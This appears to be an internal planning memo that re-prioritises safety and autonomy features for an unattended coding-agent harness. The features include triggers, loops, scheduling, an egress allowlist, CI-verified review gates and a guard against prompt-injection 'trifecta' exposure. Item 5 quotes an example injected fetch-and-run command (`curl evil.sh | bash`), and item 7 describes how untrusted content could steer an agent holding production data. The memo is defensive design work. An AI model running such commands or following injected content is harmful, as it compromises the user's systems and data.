# Kill-List Attack — §C "Deferred / Hypothesis-Gated" (the biggest suppressed ideas)

**Charter under which this re-judges:** autonomy IS the goal (bug→reviewed-PR, Slack/Linear summon, self-improving loops, cloud scheduling — designed in, never deferred). Cloud `/schedule` is a RESOLVED FACT (Anthropic infra, clones repo, runs committed skills, laptop-closed) → the "durability spike" gate is MOOT for every item that leaned on it. `disable-model-invocation:true` makes side-effect skills safe. Scale = world-class parallel fleets across 5+ repos, not solo economics.

**Verdict legend:** PROMOTE-NOW (in scope for V2) · STILL-GATED (genuine precondition that cannot be parallelized) · CUT (bad fit even at world-class — failure mode named).

**Headline finding:** The conservative §C synthesis did not have seven independent "small bets." It had **one north star (the autonomous trigger front-door) and its six safety/loop companions**, and it deferred the whole stack behind a *single decision gate it never opened* ("has V2 decided autonomy is in scope?") plus *one durability doubt now resolved*. The new charter opens that gate affirmatively. **Six of seven items PROMOTE-NOW.** The seventh is a bundle that splits — most of it promotes, one genuine watch-item stays gated, one sub-item is correctly CUT.

---

## Verdict table

| # | §C item | Verdict | Ships in V2 (world-class scope) | Safety companion | Sequencing |
|---|---------|---------|----------------------------------|------------------|------------|
| 1 | Autonomous trigger front-door (bug→PR) | **PROMOTE-NOW** | The trigger *trifecta* — GitHub label, Slack/Linear summon, CI-failure self-heal — all routing into the existing worktree → `/cr` → `pr.sh` shell. The headline deliverable. | `block-dangerous-bash.sh` (3rd guard) + Tier-0 credential firewall + structural review contract + agent-PR observability log, all as preconditions | **P0. The spine.** Front door fires only after items 2/5 floor is wired. |
| 2 | `/goal` loop primitive | **PROMOTE-NOW** | Wire `/goal` with a CI/`.cr-ok`-anchored grader; ship the REJECT tier + UNATTENDED branching it forces; document the verifier-rung taxonomy as standing doctrine. | CI-verified `.cr-ok` (rung-4 unforgeable gate); REJECT/UNATTENDED exit path | **P0 — co-sequenced, not blocked.** The two "prerequisites" are themselves P0 autonomy work, not blockers ahead of it. |
| 3 | Scheduler / heartbeat | **PROMOTE-NOW** | Cloud `/schedule` + `CronCreate` firing a recurring discovery agent; the discover/act seam with a `disable-model-invocation` gated action skill producing review-cheap PRs. | Output-shaping discipline (one scoped PR per finding) to avoid the R1 "+98% PRs, zero DORA" trap; temporal-gap audit invariant | **P0 substrate.** Durability gate MOOT. Every other autonomy mechanism is a heartbeat with a different sensor. |
| 4 | Property-based testing (money-math) | **PROMOTE-NOW** | `fast-check` (after a 30-min Vitest-4 vet), money-math invariants, PITFALLS rule: pricing changes require a property test. The first model-immutable spec the loop cannot weaken. | The invariant set IS the safety companion (human-authored oracle); adversarially-seeded golden set | **P1 — right after the unforgeable gate (R-1/R-2).** Vet is a step, not a gate. |
| 5 | Full egress firewall (proxy/pfctl) | **PROMOTE-NOW** | Egress allowlist (GitHub/Supabase/npm/Anthropic, deny rest) for *local* unattended `/queue`; cloud `/schedule` already runs restricted-network. Brings local path up to the cloud bar. | Pairs with credential firewall + destructive-op floor as the unattended-run safety triad | **P0/P1 — after one bounded check** on whether native Seatbelt egress-allowlist suffices vs. a proxy. |
| 6 | Per-feature spec layer + skill-promotion rung | **PROMOTE-NOW** | `docs/specs/` per-feature behavioral contract *with an executable Verification section*, wired into `/feature`; the autonomy gate verifies the spec, not the `.cr-ok` process token. Skill-promotion/import-vetting as an enforced gate. | Independent review pass on the spec (spec-first has no built-in adversary); `/cr` enforces, never the implementer | **P0 enabling substrate.** Designed in lockstep with item 2's unforgeable gate — not "after the memory model." |
| 7 | Outcome tracking · visual render gate · MCP trifecta gate | **SPLIT** | **MCP trifecta gate → PROMOTE-NOW (P0):** capability-tag every MCP tool/skill by trifecta leg, structural pre-tool guard refuses when all 3 legs co-resident. **Visual render gate → PROMOTE-NOW (P1):** `/verify` skill producing a PR-attached evidence bundle (a11y snapshot + console + pixel-diff), CI-resident, `disable-model-invocation`-gated, fail-closed tenant assertion. **Outcome/impact tracking → STILL-GATED:** needs real merged-PR volume to measure. **Toolshed centralized registry → CUT.** | Trifecta gate IS the autonomy safety substrate; visual gate makes UI fixes mergeable unattended | **MCP trifecta P0** (governing autonomy invariant). **Visual gate P1** (UI-fix mergeability). **Outcome tracking deferred** with a measurable flip-trigger. |

---

## Per-item reasoning

### 1. Autonomous trigger front-door — PROMOTE-NOW (the headline deliverable)

**Re-mine:** `bug-to-pr-automation.md`. The most directly autonomy-relevant source in the corpus — it is literally the bug→reviewed-PR pipeline rendered as an industry survey (Stripe Minions, Ramp Inspect, Linear Agent, OpenHands, GitHub Agentic Workflows). Its load-bearing thesis (pass2-A): *the agent is the cheap interchangeable middle; the two ends — trigger quality and review contract — are where all the value lives.* Our harness has a world-class middle (isolated worktrees, deterministic pre-commit/pre-push/CI, strong `/cr`, full context files) and **no front door at all** (pass3 §b(1): "the single largest gap the article exposes").

**Why the deferral was pure conservative bias:** the old disposition (§C, hypothesis-gated) found the biggest move in the article and put it behind a decision gate that was never opened. The two pillars of the deferral are both demolished: (a) "machine asleep / durability" — MOOT, cloud `/schedule` exists; (b) "hypothesis-before-speculative-build / wait until V2 decides" — the charter *is* that decision, made affirmatively. The pass2-F suppression reasoning ("no Sentry, no triage queue, the trigger question collapses") is false at fleet scale, where the front door is exactly what lets one engineer run parallel fleets across 5+ repos without being the per-repo dispatcher.

**What ships:** the trigger *trifecta* — GitHub `fix-me`/`agent` label, Slack/Linear `/fix <issue>` summon, CI-failure → self-heal — each reusing the existing worktree+`/cr`+`pr.sh` shell unchanged; only the *entry* is new. The side-effect open-PR/deploy/Slack action is a `disable-model-invocation:true` skill (removed from model context → safe actuator). **Safety companion (non-negotiable, ships before/with the first trigger):** `block-dangerous-bash.sh` — pass3's own conditional ("*if* we wire any autonomous trigger, this guard becomes load-bearing") now has a true antecedent. This is the rare ELEVATE that means *raise priority and make it a precondition*, not "make it bigger." **Sequencing: P0, the spine; gated only on the safety floor (items 2 + 5) being wired first.**

### 2. `/goal` loop primitive — PROMOTE-NOW (co-sequenced, not blocked)

**Re-mines:** `goal-loop-primitive.md`, `loop-engineering.md`. The conservative read inverted cause and effect: it said "`/goal` adoption is *blocked* until CI-verified `.cr-ok` and `/cr` REJECT routing exist." Backwards. `/goal` is the **loop primitive** — the in-session "should there be another turn?" engine that *every* autonomous loop (bug→PR, self-improving) requires. You cannot run any autonomous loop without it. And the two "prerequisites" are themselves P0 autonomy work, not obstacles ahead of one wrapper:

- **CI-verified `.cr-ok`** (`recursive-self-improvement.md` Move 1, `goal-loop-primitive.md`): the Node 8.5(c) hole — `.cr-ok` is gitignored, consumed only by the local pre-push hook, **CI never verifies it**. Under autonomy this is the *keystone safety boundary*: the only thing standing between "the model agreed with itself" and "shipped to main." The machinery exists (`.cr-ok` chain + real CI oracle); only the wiring is missing. **The rung taxonomy** (`goal-loop-primitive.md`, recovered as NEW) is the standing test: a rung-1/2 signal (transcript grader) may control *continuation* but never *certification* — that must bottom out at rung 3/4 (CI-green-on-SHA). This prevents trust-laundering, the recurring failure as stop-signals proliferate.
- **REJECT/UNATTENDED routing**: the failure-mode contract for every autonomous trigger. A Slack-summoned loop *needs* a defined answer to "what happens when the agent can't finish?" — silence is not an option when no human is watching. Bounded turn/time cap → on cap-exceeded branch on UNATTENDED (re-queue vs NEEDS-HUMAN + push notification).

**Sequencing: P0, co-sequenced with its two structural fixes** — `/goal` is the forcing function that makes them mandatory, not a thing that waits behind them.

### 3. Scheduler / heartbeat — PROMOTE-NOW (durability gate is MOOT)

**Re-mine:** `loop-engineering.md` ("You Built the Harness, Not the Loop"). The single load-bearing claim: a *harness* fires only when a human types something; a *loop* finds its own work on a schedule. The **one** objection that gated this whole move — *does the scheduler fire when the laptop is closed?* — is now a RESOLVED FACT. So the deferral collapses entirely.

Two of the three conservative gating conditions also dissolve: gate (i) "name a durable scheduler" is *done* (cloud `/schedule`); gate (iii) "wire the morning-review human consumer" is dissolved by autonomy itself — the loop triggers a *gated action agent* (bug→PR), not a file a human reads on an unscheduled morning. Only gate (ii) (build the discovery inputs) remains, and that is a build task, not a reason to defer.

**Honest carry-forward of the one real tension (C3):** `loop-engineering.md` upholds the R1 finding (Svpino: +98% PRs, +154% PR size, **zero DORA gain**) — "don't generate more than you can review." Elevate the discover/act *seam*, but the substance of C3 is a **named failure mode the design must engineer against**: the loop must produce *review-cheap output* (one scoped, pre-validated PR per finding), not 30 raw triage items. Plus the **temporal-gap audit doctrine** elevated from "add a column to a markdown table" to an *enforced invariant*: no committed ritual may exist without a clock, checked mechanically (a control with no enforcing hook is a hope). **Sequencing: P0 substrate — every other autonomy mechanism is a heartbeat with a different sensor and a different gated payload.**

### 4. Property-based testing (money-math) — PROMOTE-NOW

**Re-mine:** `recursive-self-improvement.md` Move 3. This is the rare deferral that was *under-sold even on its own merits*, independent of scale. PBT asserts an *invariant* the framework tries to break with hundreds of adversarial inputs — and a property is "something the model can't argue with": a **human-authored, model-immutable specification of correctness**, the actual scarce resource the whole essay circles. This product is the textbook case: integer-cents money, line-item totals, tax-on-goods-only, discounts, service fees, where a wrong total is a $30k-client-facing disaster.

Under autonomy it becomes *structurally essential*: when the loop writes both the pricing code AND its example tests (the "oracle is increasingly model-authored" crack), the human-specified invariant is the **only** check the loop cannot quietly weaken. The "deferred pending tooling vetting" framing is correct as a 30-minute step, wrong as a reason to schedule it late. **Safety companion:** the invariant set itself + adversarially-seeded golden set (`recursive-self-improvement.md` Move 4 — a friendly-only corpus produces a recall number optimistic by construction). **Sequencing: P1, immediately after the unforgeable gate (R-1/R-2).** Vet `fast-check` against Vitest 4 / TS 5 (name/purpose/downloads/last-publish/ships-types per the dependency rule) as a step, not a gate.

### 5. Full egress firewall (proxy/pfctl) — PROMOTE-NOW

**Re-mine:** `agent-sandboxing-10co.md` Move 3. The clearest case of the SCALE BIAS + cloud-`/schedule` MOOT-objection. Credential topology (Move 1) defeats *exfiltration of a key in the box*; it does **nothing** against a prompt-injected `npm install evil-pkg` / `curl evil.sh | bash` (code-compromise, the Cline-Feb-2026 vector). The egress allowlist is the *only* control for that class — and event-vendor has none at any layer.

The conservative deferral rested on two now-dead premises: (1) "maintenance difficult for a solo dev" — struck by the charter; at fleet scale across 5+ repos a one-time allowlist is *more* valuable, amortized via plugin/marketplace distribution; (2) the implicit "laptop network = agent network" — but **cloud `/schedule` runs on Anthropic infra with restricted network by default**, so the egress primitive *already partially exists for the autonomous path*; the gap is the **local** `/queue` path. Pass 2 itself ranked this Tier-1; pass 3 demoted it on solo-economics the charter retires. **Sequencing: P0/P1 — after one bounded check** on whether native Claude Code Seatbelt egress-allowlist on macOS makes a separate proxy unnecessary. **Companion items from the same source that also PROMOTE-NOW:** the destructive-SQL/deploy floor (the absent 3rd guard, full scope: deploys + destructive SQL + boundary `rm`; the literal Replit-July-2025 + PocketOS-2026 incident class) and the migration-credential ADR (agent verifies locally / human applies to prod, with a `supabase db push`-from-worktree block — the load-bearing exception that, left open, defeats the credential firewall).

### 6. Per-feature spec layer + skill-promotion rung — PROMOTE-NOW (enabling substrate, not "after the memory model")

**Re-mines:** `notion-spec-driven.md`, `osmani-agent-skills.md`. The spec layer is "the load-bearing autonomy primitive of the entire corpus, not a Phase-5 paperwork decision." Bug→PR and Slack-summoned builds are *only* safe if a cold-start, stateless agent can re-establish what a feature is *for* and verify it behaves correctly **without a human** — which is exactly and only what a per-feature spec-with-runnable-Verification provides. Confirmed structural absence (§3a/§4): no per-feature behavioral contract exists; CLAUDE.md *names* `docs/specs/` but it is unbuilt.

Two conservative errors: (1) it treated a confirmed structural absence as a "scope question" to defer — the charter says never reject a doc class merely because it adds files ("clarity beats minimalism"); (2) the proposed mitigation ("absorb into `docs/adr/` + a verification section in tests") is the *wrong abstraction* — ADRs are cross-feature *decisions* with no behavior contract, and developer-authored tests are not a spec-derived oracle. The spec is the one durable, **tool-agnostic** idea in a tool-churning landscape (it outlives Codex/Boxy/any agent). **What ships:** `docs/specs/` wired into `/feature`, shipping with its executable Verification section from day one; the autonomy gate verifies the *spec*, not the `.cr-ok` process token (which "certifies the wrong thing"). **Skill-promotion / import-vetting** (`osmani-agent-skills.md`): an *enforced* `/cr`-style gate when a new skill lands — the moment the harness is distributed across 5+ repos via marketplace, an unenforced import screen drifts. **Safety companion:** an *independent* review pass on the spec (spec-first has no built-in adversary — do NOT copy Notion's self-verification-by-implementer). **Sequencing: P0 enabling substrate, designed in lockstep with item 2's unforgeable gate** — the "sequence after the memory model" ordering is wrong on priority.

### 7. Outcome tracking · visual render gate · MCP trifecta gate — SPLIT

This conservative bundle is three different things glued together. They split:

- **MCP trifecta gate → PROMOTE-NOW (P0).** Re-mine: `mcp-servers.md` — "the single biggest suppressed move." `.env.local` points at production Supabase, so every agent with Supabase MCP *permanently* holds leg-1 (private prod data); the only question is whether leg-2 (untrusted content) and leg-3 (egress) ever co-reside, and today nothing structural prevents it. The conservative read sized it as one advisory line under human supervision; under autonomy (unattended scheduled agent reads prod PII + fetches a web page + opens a PR/sends Slack = the textbook trifecta with the human removed) it is *the governing safety invariant for autonomy itself*. Ships as: capability-tag every MCP tool/skill by leg, a structural session-start/pre-tool guard computing leg-union and refusing/hard-gating when all three light up, integrated with `disable-model-invocation:true` so a side-effect skill is the *sole isolated egress*, never co-resident with an untrusted reader.

- **Visual render gate (full build) → PROMOTE-NOW (P1).** Re-mines: `playwright-mcp-debug.md`, `vercel-agentic-infra.md`. The real move is "a deterministic, artifact-producing verification gate that reaches CI" — `.cr-ok`-reaches-CI is the floor, browser-evidence the ceiling. An unattended bug→PR loop is unsafe *without* it (no human to catch the confident-wrong merge). Ships as: a `/verify` project skill producing a PR-attached evidence bundle (a11y snapshot + console errors + pixel-diff vs. checked-in baseline), CI-resident against a preview deploy, `disable-model-invocation`-gated so the agent can't fabricate or skip it. **Plus a NEW, recovered hard requirement: fail-closed tenant assertion before any snapshot is trusted** — a browser snapshot taken while authed as the *wrong tenant* renders perfectly and yields a confident-wrong diagnosis (RLS isolation is invisible to the DOM); for multi-tenant SaaS this is a security-incident generator. Note: chrome-devtools-mcp is **headed-only** (breaks in CI/overnight) — the unattended verify leg must run as a **CI job against a preview deploy**, not via a local MCP, which reinforces the CI-resident artifact design.

- **Outcome / impact tracking → STILL-GATED.** Re-mine: `stripe-minions-kaliski.md` (escaped-defect × volume; DORA). This is the one sub-item that genuinely needs a precondition that *cannot* be parallelized: it measures the outcome of merged autonomous PRs, so it requires a real, sustained volume of merged autonomous PRs to measure against. Building the metric dashboard before the trigger front-door produces merged PRs is measuring an empty pipeline. **Precondition: items 1+3 shipping and producing merged autonomous PRs at volume. Flip-trigger:** the moment the bug→PR loop merges ≥N autonomous PRs/week, escaped-defect-rate and review-load become first-class metrics. (Distinct from the *golden-set recall calibration* in `recursive-self-improvement.md` Move 2, which PROMOTES-NOW because it runs against a curated corpus, not live volume.)

- **Toolshed centralized MCP registry → CUT.** Re-mine: `stripe-minions-kaliski.md` Move (Toolshed). Even at world-class fleet scale, building a Stripe-style 500-tool centralized registry with task-time curation *today* solves a problem we don't have — our tool surface is genuinely small and skills already load on invocation (the principle is satisfied by a different mechanism). **Failure mode of building it now:** a speculative abstraction with no token-paralysis traffic to justify it — the exact over-engineering the charter's "build what's needed now" still forbids. (A per-task tool-curation *manifest* is a near-horizon watch-item if connector surface grows, but the centralized-registry build is CUT.)

---

## Sequencing summary (P0 autonomy-enablement vs. dependent)

**P0 — the autonomy safety floor (must ship before/with the first trigger):**
- CI-verified `.cr-ok` / unforgeable rung-4 gate (item 2 prerequisite)
- `block-dangerous-bash.sh` destructive-op floor (item 1/5 companion)
- Tier-0 credential firewall enforced as a pre-flight invariant (item 5 companion)
- MCP trifecta structural guard (item 7)
- REJECT/UNATTENDED exit contract (item 2)

**P0 — the spine + substrate (ship on the floor):**
- Autonomous trigger front-door trifecta (item 1) — the headline
- `/goal` loop primitive (item 2)
- Cloud heartbeat / scheduler (item 3)
- Per-feature spec layer with executable Verification (item 6)
- Egress allowlist for local unattended runs (item 5)

**P1 — ship right after the floor + spine:**
- Property-based testing on money-math (item 4)
- Visual render gate `/verify` + fail-closed tenant assertion (item 7)
- Skill-promotion / import-vetting enforced gate (item 6)

**STILL-GATED (genuine, unparallelizable precondition):**
- Outcome/impact tracking (item 7) — gated on real merged-PR volume; named flip-trigger ≥N autonomous PRs/week.

**CUT (bad fit even at world-class — failure mode named):**
- Toolshed centralized MCP registry (item 7) — speculative abstraction, no token-paralysis traffic to justify it.

**Net of the 7 §C items:** 6 PROMOTE-NOW (item 7 splits to mostly-promote), 1 genuine STILL-GATED sub-item (outcome tracking), 1 CUT sub-item (Toolshed). The conservative synthesis's defining error was treating the autonomous trigger front-door — the corpus's single biggest move — and its entire safety-and-loop scaffolding as deferred behind a decision gate it declined to open, on durability and solo-economics grounds the new charter and the resolved cloud-`/schedule` fact both retire.
